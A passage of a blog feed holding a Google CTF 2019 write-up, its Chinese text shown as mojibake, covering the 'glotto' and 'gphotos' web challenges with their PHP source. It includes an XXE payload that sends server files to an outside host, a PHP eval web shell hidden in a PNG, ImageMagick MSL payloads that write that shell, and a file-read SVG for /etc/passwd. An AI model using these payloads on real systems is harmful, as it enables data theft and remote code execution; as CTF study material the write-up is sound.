target="_blank" rel="noopener">https://cfreal.github.io/google-ctf-2019-glotto-writeup.html</a></p><p>Expï¼š<br><a href="https://github.com/cfreal/exploits/tree/master/gctf-2019-glotto" target="_blank" rel="noopener">https://github.com/cfreal/exploits/tree/master/gctf-2019-glotto</a></p><p>é¢˜ç›®çš„å…³é”®éƒ¨åˆ†ä»£ç :<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'config.php'</span>);</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'watchdog.php'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gen_winner</span><span class="params">($count, $charset=<span class="string">'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $len = strlen($charset);</span><br><span class="line">        $rand = openssl_random_pseudo_bytes($count);</span><br><span class="line">        $secret = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $count; $i++)</span><br><span class="line">        &#123;</span><br><span class="line">            $secret .= $charset[ord($rand[$i]) % $len];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'src'</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(highlight_string(file_get_contents(<span class="keyword">__FILE__</span>)));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'code'</span>])) &#123;</span><br><span class="line">        session_start();</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'winner'</span>])) <span class="keyword">die</span>;</span><br><span class="line">        $win = $_SESSION[<span class="string">'winner'</span>];</span><br><span class="line">        <span class="keyword">unset</span>($_SESSION[<span class="string">'winner'</span>]);</span><br><span class="line">        session_destroy();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($_POST[<span class="string">'code'</span>] === $win)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"You won! $flag"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            sleep(<span class="number">5</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"You didn't win :(&lt;br&gt;The winning ticket was $win"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    $tables = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'march'</span>,</span><br><span class="line">        <span class="string">'april'</span>,</span><br><span class="line">        <span class="string">'may'</span>,</span><br><span class="line">        <span class="string">'june'</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    $winner = gen_winner(<span class="number">12</span>);</span><br><span class="line">    $_SESSION[<span class="string">'winner'</span>] = $winner;</span><br><span class="line"></span><br><span class="line">    $db = <span class="keyword">new</span> mysqli(<span class="keyword">null</span>, $dbuser, $dbpass, $dbname, <span class="keyword">null</span>, $socket);</span><br><span class="line">    <span class="comment">//$db = new mysqli($dbhost, $dbuser, $dbpass, $dbname);</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ($db-&gt;connect_errno) &#123;</span><br><span class="line">        printf(<span class="string">"Connect failed: %s\n"</span>, $db-&gt;connect_error);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">    $db-&gt;query(<span class="string">"SET @lotto = '$winner'"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($tables); $i++)</span><br><span class="line">    &#123;</span><br><span class="line">        $order = <span class="keyword">isset</span>($_GET[<span class="string">"order&#123;$i&#125;"</span>]) ? $_GET[<span class="string">"order&#123;$i&#125;"</span>] : <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span> (stripos($order, <span class="string">'benchmark'</span>) !== <span class="keyword">false</span>) <span class="keyword">die</span>;</span><br><span class="line">        $&#123;<span class="string">"result$i"</span>&#125; = $db-&gt;query(<span class="string">"SELECT * FROM &#123;$tables[$i]&#125; "</span> . ($order != <span class="string">''</span> ? <span class="string">"ORDER BY `"</span>.$db-&gt;escape_string($order).<span class="string">"`"</span> : <span class="string">""</span>));</span><br><span class="line">        <span class="keyword">if</span> (!$&#123;<span class="string">"result$i"</span>&#125;) <span class="keyword">die</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="0x03-gphotos"><a href="#0x03-gphotos" class="headerlink" title="0x03 gphotos"></a>0x03 gphotos</h2><p>é¢˜ç›®æè¿°ï¼š</p><p>Upload your photoz. FYI: /info.php</p><p>é¢˜ç›®é“¾æ¥ï¼š</p><p><a href="http://gphotos.ctfcompetition.com:1337/" target="_blank" rel="noopener">http://gphotos.ctfcompetition.com:1337/</a></p><p>é¢˜ç›®è§£æï¼š</p><p>é¦–å…ˆå³é”®æºç çœ‹æºç å°±é¢å¯ä»¥çœ‹åˆ°è¿™ä¸ªä¸Šä¼ åŠŸèƒ½å¯¹åº”çš„åç«¯PHPä»£ç <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://gphotos.ctfcompetition.com:1337/?action=src</span><br></pre></td></tr></table></figure></p><p>é€šè¿‡é˜…è¯»ä»£ç å¯ä»¥å‘ç°ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ol><li><code>mime_content_type</code>æ¥æ£€æµ‹æ–‡ä»¶çš„MIMEç±»å‹å¹¶ä¸”é™åˆ¶äº†åªèƒ½æ˜¯<code>image/gif</code>, <code>image/png</code>, <code>image/jpeg</code>, <code>image/svg+xml</code> è¿™å››ç§ç±»å‹ã€‚</li><li>ä¹‹åä½¿ç”¨<code>get_size</code>å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å¯¹<code>image/png</code>, <code>image/jpeg</code>,ä¼šæ£€æµ‹å¤§å°ï¼Œå¦‚æœæ˜¯å…¶å®ƒç±»å‹å°±å½“åšxmlæ–‡ä»¶æ¥å¤„ç†ã€‚</li><li>åœ¨ä¹‹åå°±æ˜¯åˆ©ç”¨<code>thumbnail</code>å‡½æ•°æ¥å¾—åˆ°ç¼©ç•¥å›¾ï¼Œè¿™å…¶ä¸­å°±ä½¿ç”¨äº†ImageMagickçš„ convertå‘½ä»¤ã€‚</li><li>ä¸Šä¼ æ–‡ä»¶ä¼šè¢«ç§»åŠ¨åˆ°uploadç›®å½•ä¸‹ï¼Œå¹¶ä¸”åç¼€æ˜¯æ ¹æ®å¯¹åº”çš„MIMEç±»å‹è¿›è¡Œæ‹¼æ¥çš„ï¼Œæ–‡ä»¶åæ˜¯md5ä¹‹åçš„hashå€¼ï¼Œè€Œä¸”å›¾ç‰‡æ˜¯ç»è¿‡è½¬æ¢ä¹‹åçš„ç¼©ç•¥å›¾ï¼Œæ‰€ä»¥åœ¨å›¾ç‰‡é‡Œé¢è—shellä»£ç åŸºæœ¬ä¸å¯èƒ½çš„äº†ã€‚</li></ol><p>ä½†æ˜¯ç›®æ ‡å¯ä»¥å¤„ç†svgå›¾ï¼Œ<del>é‚£ä¹ˆå°±æ˜æ˜¾æ˜¯è¦ä½¿ç”¨XXEæ¼æ´æ¥è¾¾åˆ°æ”»å‡»çš„ç›®çš„äº†ã€‚</del> XXEåªæ˜¯å¸®åŠ©æˆ‘è·å–ImageMagickçš„é…ç½®æ–‡ä»¶ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå°trickï¼Œå°±æ˜¯åœ¨å¸¦å¤–ä¼ è¾“æ•°æ®çš„æ—¶å€™å¦‚ä½•ä¼ è¾“è¿‡é•¿çš„æ•°æ®ã€‚</p><p>ä¸Šä¼ å¦‚ä¸‹svgå›¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line"> &lt;!DOCTYPE foo [  </span><br><span class="line">   &lt;!ELEMENT svg ANY &gt;</span><br><span class="line">   &lt;!ENTITY % remote SYSTEM &quot;http://bushwhackers.ru:8003/ev.xml&quot; &gt;</span><br><span class="line">%remote;%template;</span><br><span class="line">   ]&gt;&lt;svg&gt;&amp;res;&lt;/svg&gt;</span><br></pre></td></tr></table></figure><p>ev.xmlæ–‡ä»¶çš„å†…å®¹å¦‚ä¸‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % secret SYSTEM &quot;THING_TO_STEAL&quot; &gt;</span><br><span class="line">&lt;!ENTITY % template &quot;&lt;!ENTITY res SYSTEM &apos;http://bushwhackers.ru:8003/a?%secret;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>ä½†æ˜¯æ­¤æ—¶çš„ev.xmlå¯¹äºç›´æ¥ä¼ è¾“ä¸€ä¸ªæ–‡ä»¶è€Œè¨€è¿˜æ˜¯ä¸å¥½ç”¨ï¼Œæ‰€ä»¥å€ŸåŠ©phpçš„ä¼ªåè®®æ¥åŠ©æ”»ä¸€ä¸‹ã€‚æ€»ä¹‹å°±æ˜¯å‹ç¼©ä¹‹åè¿›è¡Œbase64</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % secret SYSTEM &quot;php://filter/convert.base64-encode/resource=php://filter/zlib.deflate/resource=file:///etc/ImageMagick-6/policy.xml&quot; &gt;</span><br><span class="line">&lt;!ENTITY % template &quot;&lt;!ENTITY res SYSTEM &apos;http://bushwhackers.ru:8003/a?%secret;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>ä¹‹åçš„paylaodè¿˜æ˜¯å€ŸåŠ©ImageMagickåœ¨å¤„ç†ç‰¹æ®Šçš„mslæ–‡ä»¶æ—¶ä¼šæ‰§è¡Œå…¶ä¸­çš„å‘½ä»¤æ¥è§¦å‘(è¿™ä¸ªç‰¹æ€§å¥½åƒåªåœ¨debainä¸Šå­˜åœ¨)ï¼Œå…·ä½“çš„æ”»å‡»æµç¨‹å¦‚ä¸‹ï¼š</p><p>é¦–å…ˆä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ç”ŸæˆåŒ…å«webshellçš„pngï¼Œä¸Šä¼ ä¹‹åä¸»é¡µä¼šè¿”å›è·¯å¾„å’Œæ–‡ä»¶å<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert -size 100x100 -comment &apos;&lt;?php eval($_GET[&quot;cmd&quot;]); ?&gt;&apos; rgba:/dev/urandom[0] shell.png</span><br></pre></td></tr></table></figure></p><p>è¿”å›å†…å®¹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/upload/&lt;hash&gt;/&lt;image&gt;.png</span><br></pre></td></tr></table></figure></p><p>PS: æ³¨æ„ä½¿ç”¨bashä¸è¦ç”¨zsh</p><p>ä¹‹åä¸Šä¼ æˆ‘ä»¬çš„svgå›¾<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!-- &lt;svg&gt; --&gt;</span><br><span class="line">&lt;image&gt;</span><br><span class="line">  &lt;read filename=&quot;/var/www/html/upload/&lt;hash&gt;/&lt;image&gt;.png&quot; /&gt;</span><br><span class="line">  &lt;write filename=&quot;/var/www/html/upload/shell_huihui.php&quot; /&gt;</span><br><span class="line">  &lt;svg width=&quot;120px&quot; height=&quot;120px&quot;&gt;</span><br><span class="line">    &lt;image href=&quot;/var/www/html/upload/&lt;hash&gt;/&lt;image&gt;.png&quot; /&gt;</span><br><span class="line">  &lt;/svg&gt;</span><br><span class="line">&lt;/image&gt;</span><br></pre></td></tr></table></figure></p><p>è¿”å›å†…å®¹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/upload/&lt;hash&gt;/&lt;image2&gt;.svg</span><br></pre></td></tr></table></figure></p><p>æœ€åå†ä¸Šä¼ å¦‚ä¸‹çš„svgæ¥å°†ä¸Šä¸€ä¸ªsvgå†…å®¹è¿›è¡Œæ‰§è¡Œ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;svg width=&quot;120px&quot; height=&quot;120px&quot;&gt;</span><br><span class="line">  &lt;image width=&quot;120&quot; height=&quot;120&quot; href=&quot;msl:/var/www/html/upload/&lt;hash&gt;/&lt;image2&gt;.svg&quot; /&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure></p><p>æœ€åæ‰§è¡Œåœ¨webrootç›®å½•ä¸‹çš„webshellå³å¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://gphotos2.ctfcompetition.com:1337/upload/shell_huihui.php?cmd=system(&apos;/get_flag&apos;)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå­¦åˆ°çš„å‡ ä¸ªç‚¹ï¼š</p><ol><li>XXEå¸¦å¤–ä¼ è¾“å¤§æ–‡ä»¶çš„æ–¹æ³•</li><li>Debians+ä¸å®‰å…¨çš„ImageMagické…ç½®å°†ä¼šå¯¼è‡´hrefæ ‡ç­¾çš„ä¼ªåè®®è¯»æ–‡ä»¶æˆ–è€…æ˜¯é…åˆmslæ–‡ä»¶æ‰§è¡Œå‘½ä»¤</li></ol><p>like<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;svg width=&quot;120px&quot; height=&quot;120px&quot;&gt;</span><br><span class="line">  &lt;image width=&quot;120&quot; height=&quot;120&quot; href=&quot;text:/etc/passwd&quot; /&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure></p><p>ç½‘ç«™çš„å…³é”®æºç <br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'config.php'</span>);</span><br><span class="line">error_reporting( E_ALL );</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="comment">// totally not copy&amp;pasted from somewhere...</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_size</span><span class="params">($file, $mime_type)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($mime_type == <span class="string">"image/png"</span>||$mime_type == <span class="string">"image/jpeg"</span>) &#123;</span><br><span class="line">        $stats = getimagesize($file);</span><br><span class="line">        $width = $stats[<span class="number">0</span>];</span><br><span class="line">        $height = $stats[<span class="number">1</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $xmlfile = file_get_contents($file);</span><br><span class="line">        $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">        $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">        $svg = simplexml_import_dom($dom);</span><br><span class="line">        $attrs = $svg-&gt;attributes();</span><br><span class="line">        $width = (int) $attrs-&gt;width;</span><br><span class="line">        $height = (int) $attrs-&gt;height;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> [$width, $height];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">workdir</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $d = <span class="string">'upload/'</span>.md5(session_id());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!is_dir($d))</span><br><span class="line">        mkdir($d);</span><br><span class="line">    <span class="keyword">return</span> $d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">list_photos</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $d = <span class="string">'upload/'</span>.md5(session_id());</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (!is_dir($d)) <span class="keyword">return</span> [];</span><br><span class="line"></span><br><span class="line">    $result = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(glob(<span class="string">"&#123;$d&#125;/*.*"</span>) <span class="keyword">as</span> $f) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strrpos($f, <span class="string">'small'</span>) === <span class="keyword">FALSE</span>)</span><br><span class="line">            $result[basename($f)] = $f;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_FILES[<span class="string">'photo'</span>]))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    $p = <span class="keyword">new</span> PhotoUpload($_FILES[<span class="string">'photo'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">    $p-&gt;thumbnail();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PhotoUpload</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $failed = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">        $formats = [</span><br><span class="line">            <span class="string">"image/gif"</span> =&gt; <span class="string">"gif"</span>,</span><br><span class="line">            <span class="string">"image/png"</span> =&gt; <span class="string">"png"</span>,</span><br><span class="line">            <span class="string">"image/jpeg"</span> =&gt; <span class="string">"jpg"</span>,</span><br><span class="line">            <span class="string">"image/svg+xml"</span> =&gt; <span class="string">"svg"</span>,</span><br><span class="line">            <span class="comment">// Uncomment when launching gVideoz</span></span><br><span class="line">            <span class="comment">//"video/mp4" =&gt; "mp4",</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $mime_type = mime_content_type($path);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!array_key_exists($mime_type, $formats)) &#123;</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $size = get_size($path, $mime_type);</span><br><span class="line">        <span class="keyword">if</span> ($size[<span class="number">0</span>] * $size[<span class="number">1</span>] &gt; <span class="number">65536</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext = $formats[$mime_type];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = hash_hmac(<span class="string">'md5'</span>, uniqid(), $secret).<span class="string">".&#123;$this-&gt;ext&#125;"</span>;</span><br><span class="line"></span><br><span class="line">        move_uploaded_file($path, workdir().<span class="string">"/&#123;$this-&gt;name&#125;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">thumbnail</span><span class="params">()</span> </span>&#123;</span><br><span class="line">         exec(escapeshellcmd(<span class="string">'convert '</span>.workdir().<span class="string">"/&#123;$this-&gt;name&#125;"</span>.<span class="string">' -resize 128x128 '</span>.workdir().<span class="string">"/&#123;$this-&gt;name&#125;_small.jpg"</span>), $out, $ret);</span><br><span class="line">         <span class="keyword">if</span> ($ret)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;failed = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;failed) &#123;</span><br><span class="line">            shell_exec(escapeshellcmd(<span class="string">'rm '</span>.workdir().<span class="string">"/&#123;$this-&gt;name&#125;"</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>])) &#123;</span><br><span class="line">    <span class="keyword">switch</span> ($_GET[<span class="string">'action'</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'upload'</span>:</span><br><span class="line">            upload();</span><br><span class="line">            header(<span class="string">'Location: ?'</span>);</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'src'</span>:</span><br><span class="line">            show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;gPhotoz&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">            &lt;form action=<span class="string">"?action=upload"</span> method=<span class="string">"POST"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">                &lt;input type=<span class="string">"file"</span> name=<span class="string">"photo"</span>&gt;&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Upload"</span>&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span> <span class="keyword">foreach</span>(list_photos() <span class="keyword">as</span> $name =&gt; $path): <span class="meta">?&gt;</span></span><br><span class="line">            &lt;div&gt;</span><br><span class="line">                &lt;a href=<span class="string">"&lt;?=$path?&gt;"</span> alt=<span class="string">"&lt;?=$name?&gt;"</span>&gt;&lt;img src=<span class="string">"&lt;?=$path.'_small.jpg'?&gt;"</span>&gt;&lt;/a&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span> <span class="keyword">endforeach</span> <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line"></span><br><span class="line">    &lt;a href=<span class="string">"?action=src"</span>&gt;&lt;/a&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h2&gt;&lt;p&gt;å†™ç¯‡å¤ç›˜çš„å°æ°´æ–‡&lt;br&gt;æ–‡ç« é¦–å‘åœ¨åˆå¤©å…¬ä¼—å·ï¼Œè½¬è½½è¯·æ³¨æ„&lt;/p&gt;
&lt;h2 id=&quot;0x01-BNV&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Razzer-Finding Kernel Race Bugs through Fuzzing</title>
    <link href="http://zer0yu.github.io/2019/06/30/Razzer-Finding-Kernel-Race-Bugs-through-Fuzzing/"/>
    <id>http://zer0yu.github.io/2019/06/30/Razzer-Finding-Kernel-Race-Bugs-through-Fuzzing/</id>
    <published>2019-06-30T13:12:32.000Z</published>
    <updated>2019-06-30T13:18:15.000Z</updated>
    
